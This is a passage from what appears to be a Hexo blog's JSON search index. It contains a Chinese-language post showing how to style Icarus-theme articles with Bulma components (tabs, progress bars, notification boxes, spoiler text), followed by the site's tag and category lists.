event.target.classList.add('is-loading'); $.ajax({ type: 'GET', url: 'https://v1.hitokoto.cn/', success: function (data) { $('.hitokoto').text(data.hitokoto); event.target.classList.remove('is-loading'); } });}&lt;/script&gt; 进度条 点击展开代码 >folded12345&lt;progress class=&quot;progress is-info&quot; value=&quot;20&quot; max=&quot;100&quot;&gt;&lt;/progress&gt;&lt;progress class=&quot;progress is-success&quot; value=&quot;40&quot; max=&quot;100&quot;&gt;&lt;/progress&gt;&lt;progress class=&quot;progress is-warning&quot; value=&quot;60&quot; max=&quot;100&quot;&gt;&lt;/progress&gt;&lt;progress class=&quot;progress is-danger&quot; value=&quot;80&quot; max=&quot;100&quot;&gt;&lt;/progress&gt;&lt;progress class=&quot;progress is-info&quot; max=&quot;100&quot;&gt;&lt;/progress&gt; 标签页 Pictures Music Videos Documents Pixabay 是全球知名的图库网站及充满活力的创意社区,拥有上百万张免费正版高清照片素材,涵盖风景、人物、动态、静物等多种分类,你可以在任何地方使用 Pixabay 图库中的素材… 网易云音乐 是一款专注于发现与分享的音乐产品,依托专业音乐人、DJ、好友推荐及社交功能,为用户打造全新的音乐生活。 哔哩哔哩 是国内知名的视频弹幕网站,这里有最及时的动漫新番,最棒的ACG氛围,最有创意的Up主。大家可以在这里找到许多欢乐。 石墨文档 是全新一代云 Office 办公软件,支持多人在线协作编辑文档和表格,独有内容级安全,全过程留痕可追溯。PC 端和移动端全覆盖,随时随地远程办公。即写即存… .content .tabs ul { margin: 0; } .tab-content { display: none; } function onTabClick (event) { var tabTitle = $(event.currentTarget).children('span:last-child').text(); $('.article .content .tab-content').css('display', 'none'); $('.article .content .tabs li').removeClass('is-active'); $('#' + tabTitle).css('display', 'block'); $(event.currentTarget).parent().addClass('is-active'); } 点击展开代码 >folded12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;div class=&quot;tabs is-toggle&quot;&gt;&lt;ul&gt;&lt;li class=&quot;is-active&quot;&gt;&lt;a onclick=&quot;onTabClick(event)&quot;&gt;&lt;span class=&quot;icon is-small&quot;&gt;&lt;i class=&quot;fas fa-image&quot; aria-hidden=&quot;true&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;span&gt;Pictures&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a onclick=&quot;onTabClick(event)&quot;&gt;&lt;span class=&quot;icon is-small&quot;&gt;&lt;i class=&quot;fas fa-music&quot; aria-hidden=&quot;true&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;span&gt;Music&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a onclick=&quot;onTabClick(event)&quot;&gt;&lt;span class=&quot;icon is-small&quot;&gt;&lt;i class=&quot;fas fa-film&quot; aria-hidden=&quot;true&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;span&gt;Videos&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a onclick=&quot;onTabClick(event)&quot;&gt;&lt;span class=&quot;icon is-small&quot;&gt;&lt;i class=&quot;far fa-file-alt&quot; aria-hidden=&quot;true&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;span&gt;Documents&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;{% raw %}&lt;div id=&quot;Pictures&quot; class=&quot;tab-content&quot; style=&quot;display: block;&quot;&gt;{% endraw %}[Pixabay](https://pixabay.com/zh/) 是全球知名的图库网站及充满活力的创意社区,拥有上百万张免费正版高清照片素材,涵盖风景、人物、动态、静物等多种分类,你可以在任何地方使用 Pixabay 图库中的素材...{% raw %}&lt;/div&gt;{% endraw %}{% raw %}&lt;div id=&quot;Music&quot; class=&quot;tab-content&quot;&gt;{% endraw %}[网易云音乐](https://music.163.com/) 是一款专注于发现与分享的音乐产品,依托专业音乐人、DJ、好友推荐及社交功能,为用户打造全新的音乐生活。{% raw %}&lt;/div&gt;{% endraw %}{% raw %}&lt;div id=&quot;Videos&quot; class=&quot;tab-content&quot;&gt;{% endraw %}[哔哩哔哩](https://www.bilibili.com/) 是国内知名的视频弹幕网站,这里有最及时的动漫新番,最棒的ACG氛围,最有创意的Up主。大家可以在这里找到许多欢乐。{% raw %}&lt;/div&gt;{% endraw %}{% raw %}&lt;div id=&quot;Documents&quot; class=&quot;tab-content&quot;&gt;{% endraw %}[石墨文档](https://shimo.im/) 是全新一代云 Office 办公软件,支持多人在线协作编辑文档和表格,独有内容级安全,全过程留痕可追溯。PC 端和移动端全覆盖,随时随地远程办公。即写即存...{% raw %}&lt;/div&gt;{% endraw %}&lt;style type=&quot;text/css&quot;&gt;.content .tabs ul { margin: 0; }.tab-content { display: none; }&lt;/style&gt;&lt;script&gt;function onTabClick (event) { var tabTitle = $(event.currentTarget).children('span:last-child').text(); $('.article .content .tab-content').css('display', 'none'); $('.article .content .tabs li').removeClass('is-active'); $('#' + tabTitle).css('display', 'block'); $(event.currentTarget).parent().addClass('is-active');}&lt;/script&gt; 彩色突出 Icarus 主题以白色的简洁为主，但有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以在此分享一下我的高级玩法。 点击展开代码 >folded123{% raw %}&lt;div class=&quot;notification is-info&quot;&gt;{% endraw %}[Icarus](https://blog.zhangruipeng.me/hexo-theme-icarus/) 主题以白色的简洁为主，但有时候我们希望在文章中用**特别的样式**注明一些内容，*markdown* 语法就不够用了，所以在此分享一下我的高级玩法。{% raw %}&lt;/div&gt;{% endraw %} Icarus 主题以白色的简洁为主，但有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以在此分享一下我的高级玩法。 点击展开代码 >folded123{% raw %}&lt;div class=&quot;notification is-success&quot;&gt;{% endraw %}[Icarus](https://blog.zhangruipeng.me/hexo-theme-icarus/) 主题以白色的简洁为主，但有时候我们希望在文章中用**特别的样式**注明一些内容，*markdown* 语法就不够用了，所以在此分享一下我的高级玩法。{% raw %}&lt;/div&gt;{% endraw %} Icarus 主题以白色的简洁为主，但有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以在此分享一下我的高级玩法。 点击展开代码 >folded123{% raw %}&lt;div class=&quot;notification is-warning&quot;&gt;{% endraw %}[Icarus](https://blog.zhangruipeng.me/hexo-theme-icarus/) 主题以白色的简洁为主，但有时候我们希望在文章中用**特别的样式**注明一些内容，*markdown* 语法就不够用了，所以在此分享一下我的高级玩法。{% raw %}&lt;/div&gt;{% endraw %} Icarus 主题以白色的简洁为主，但有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以在此分享一下我的高级玩法。 点击展开代码 >folded123{% raw %}&lt;div class=&quot;notification is-danger&quot;&gt;{% endraw %}[Icarus](https://blog.zhangruipeng.me/hexo-theme-icarus/) 主题以白色的简洁为主，但有时候我们希望在文章中用**特别的样式**注明一些内容，*markdown* 语法就不够用了，所以在此分享一下我的高级玩法。{% raw %}&lt;/div&gt;{% endraw %} Icarus 主题以白色的简洁为主，但有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以在此分享一下我的高级玩法。 点击展开代码 >folded123{% raw %}&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;{% endraw %}[Icarus](https://blog.zhangruipeng.me/hexo-theme-icarus/) 主题以白色的简洁为主，但有时候我们希望在文章中用**特别的样式**注明一些内容，*markdown* 语法就不够用了，所以在此分享一下我的高级玩法。{% raw %}&lt;/div&gt;&lt;/article&gt;{% endraw %} Icarus 主题以白色的简洁为主，但有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以在此分享一下我的高级玩法。 点击展开代码 >folded123{% raw %}&lt;article class=&quot;message is-success&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;{% endraw %}[Icarus](https://blog.zhangruipeng.me/hexo-theme-icarus/) 主题以白色的简洁为主，但有时候我们希望在文章中用**特别的样式**注明一些内容，*markdown* 语法就不够用了，所以在此分享一下我的高级玩法。{% raw %}&lt;/div&gt;&lt;/article&gt;{% endraw %} Icarus 主题以白色的简洁为主，但有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以在此分享一下我的高级玩法。 点击展开代码 >folded123{% raw %}&lt;article class=&quot;message is-warning&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;{% endraw %}[Icarus](https://blog.zhangruipeng.me/hexo-theme-icarus/) 主题以白色的简洁为主，但有时候我们希望在文章中用**特别的样式**注明一些内容，*markdown* 语法就不够用了，所以在此分享一下我的高级玩法。{% raw %}&lt;/div&gt;&lt;/article&gt;{% endraw %} Icarus 主题以白色的简洁为主，但有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以在此分享一下我的高级玩法。 点击展开代码 >folded123{% raw %}&lt;article class=&quot;message is-danger&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;{% endraw %}[Icarus](https://blog.zhangruipeng.me/hexo-theme-icarus/) 主题以白色的简洁为主，但有时候我们希望在文章中用**特别的样式**注明一些内容，*markdown* 语法就不够用了，所以在此分享一下我的高级玩法。{% raw %}&lt;/div&gt;&lt;/article&gt;{% endraw %} 活用 Bulma 美化 Icarus 文章 Icarus 主题以白色的简洁为主，但有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以在此分享一下我的高级玩法。 点击展开代码 >folded12345{% raw %}&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-header&quot;&gt;{% endraw %}活用 Bulma 美化 Icarus 文章{% raw %}&lt;/div&gt;&lt;div class=&quot;message-body&quot;&gt;{% endraw %}[Icarus](https://blog.zhangruipeng.me/hexo-theme-icarus/) 主题以白色的简洁为主，但有时候我们希望在文章中用**特别的样式**注明一些内容，*markdown* 语法就不够用了，所以在此分享一下我的高级玩法。{% raw %}&lt;/div&gt;&lt;/article&gt;{% endraw %} 点击展开代码点击展开代码 >folded123``` js 点击展开代码 &gt;foldedconsole.log('I love Icarus!');``` 你知道的太多了 .heimu { color: #000; background-color: #000; } .heimu:hover { color: #fff; } iMaeGoo 出自独立游戏 World of Goo 里小粘球的叫声，读作 /ɪ’mæɡu/ 不是爱妹狗啊，在家里电脑还是个大头（CRT）的时候就在玩了，其实头像也是在当时设定的，一直沿用至今。找不到女朋友誓不改头像 点击展开代码 >folded1234567{% raw %}&lt;style type=&quot;text/css&quot;&gt;.heimu { color: #000; background-color: #000; }.heimu:hover { color: #fff; }&lt;/style&gt;{% endraw %}**iMaeGoo** 出自独立游戏 [World of Goo](https://store.steampowered.com/app/22000/) 里小粘球的叫声，读作 /ɪ'mæɡu/ {% raw %}&lt;span class=&quot;heimu&quot;&gt;不是爱妹狗啊&lt;/span&gt;{% endraw %}，在家里电脑还是个大头（CRT）的时候就在玩了，其实头像也是在当时设定的，一直沿用至今。{% raw %}&lt;span class=&quot;heimu&quot;&gt;找不到女朋友誓不改头像&lt;/span&gt;{% endraw %} 让简介不出现在正文我们知道 Hexo 用 &lt;!-- more --&gt; 可以分隔简介和正文部分，但这样简介也会在正文中出现，如果我们不想让简介部分出现在正文呢？ 点击展开代码 >folded123456789101112131415这里的内容会出现在 **简介和正文**{% raw %}&lt;div class=&quot;post-summary&quot;&gt;{% endraw %}这里的内容只会出现在 **简介**{% raw %}&lt;/div&gt;{% endraw %}&lt;!-- more --&gt;&lt;style type=&quot;text/css&quot;&gt;.post-summary { display: none; }&lt;/style&gt;这里的内容只会出现在 **正文** 封面图来源声明 &nbsp;&nbsp; Vector Landscape Vectors by Vecteezy 点击展开代码 >folded1234&lt;a class=&quot;tag is-dark is-medium&quot; href=&quot;https://www.vecteezy.com/free-vector/vector-landscape&quot; target=&quot;_blank&quot;&gt;&lt;span class=&quot;icon&quot;&gt;&lt;i class=&quot;fas fa-camera&quot;&gt;&lt;/i&gt;&lt;/span&gt;&amp;nbsp;&amp;nbsp;Vector Landscape Vectors by Vecteezy&lt;/a&gt; 这就是关于 Icarus 的高级玩法了，大家有什么想法呢，欢迎在评论区告诉小编一起讨论哦！（不是","link":"/2020/icarus-with-bulma/"}],"tags":[{"name":"js","slug":"js","link":"/tags/js/"},{"name":"android","slug":"android","link":"/tags/android/"},{"name":"chartjs","slug":"chartjs","link":"/tags/chartjs/"},{"name":"css","slug":"css","link":"/tags/css/"},{"name":"restapi","slug":"restapi","link":"/tags/restapi/"},{"name":"shadowdefender","slug":"shadowdefender","link":"/tags/shadowdefender/"},{"name":"vb","slug":"vb","link":"/tags/vb/"},{"name":"angularjs","slug":"angularjs","link":"/tags/angularjs/"},{"name":"vagrant","slug":"vagrant","link":"/tags/vagrant/"},{"name":"docker","slug":"docker","link":"/tags/docker/"},{"name":"chrome","slug":"chrome","link":"/tags/chrome/"},{"name":"cdn","slug":"cdn","link":"/tags/cdn/"},{"name":"java","slug":"java","link":"/tags/java/"},{"name":"devops","slug":"devops","link":"/tags/devops/"},{"name":"life","slug":"life","link":"/tags/life/"},{"name":"azure","slug":"azure","link":"/tags/azure/"},{"name":"nodejs","slug":"nodejs","link":"/tags/nodejs/"},{"name":"icarus","slug":"icarus","link":"/tags/icarus/"},{"name":"mysql","slug":"mysql","link":"/tags/mysql/"},{"name":"amazon","slug":"amazon","link":"/tags/amazon/"},{"name":"material","slug":"material","link":"/tags/material/"},{"name":"vue","slug":"vue","link":"/tags/vue/"},{"name":"csharp","slug":"csharp","link":"/tags/csharp/"},{"name":"security","slug":"security","link":"/tags/security/"},{"name":"tool","slug":"tool","link":"/tags/tool/"},{"name":"php","slug":"php","link":"/tags/php/"},{"name":"onedrive","slug":"onedrive","link":"/tags/onedrive/"},{"name":"oneindex","slug":"oneindex","link":"/tags/oneindex/"},{"name":"html","slug":"html","link":"/tags/html/"},{"name":"twikoo","slug":"twikoo","link":"/tags/twikoo/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"小程序","slug":"小程序","link":"/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"ubuntu","slug":"ubuntu","link":"/tags/ubuntu/"},{"name":"git","slug":"git","link":"/tags/git/"},{"name":"serverless","slug":"serverless","link":"/tags/serverless/"},{"name":"vite","slug":"vite","link":"/tags/vite/"}],"categories":[{"name":"Tech","slug":"tech","link":"/categories/tech/"},{"name":"FrontEnd","slug":"tech/frontend","link":"/categories/tech/frontend/"},{"name":"BackEnd","slug":"tech/backend","link":"/categories/tech/backend/"},{"name":"Windows","slug":"tech/windows","link":"/categories/tech/windows/"},{"name":"Android","slug":"tech/android","link":"/categories/tech/android/"},{"name":"Diary","slug":"diary","link":"/categories/diary/"},{"name":"Tool","slug":"tool","link":"/categories/tool/"},{"name":"Serverless","slug":"tech/serverless","link":"/categories/tech/serverless/"},{"name":"Linux","slug":"tech/linux","link":"/categories/tech/linux/"}]}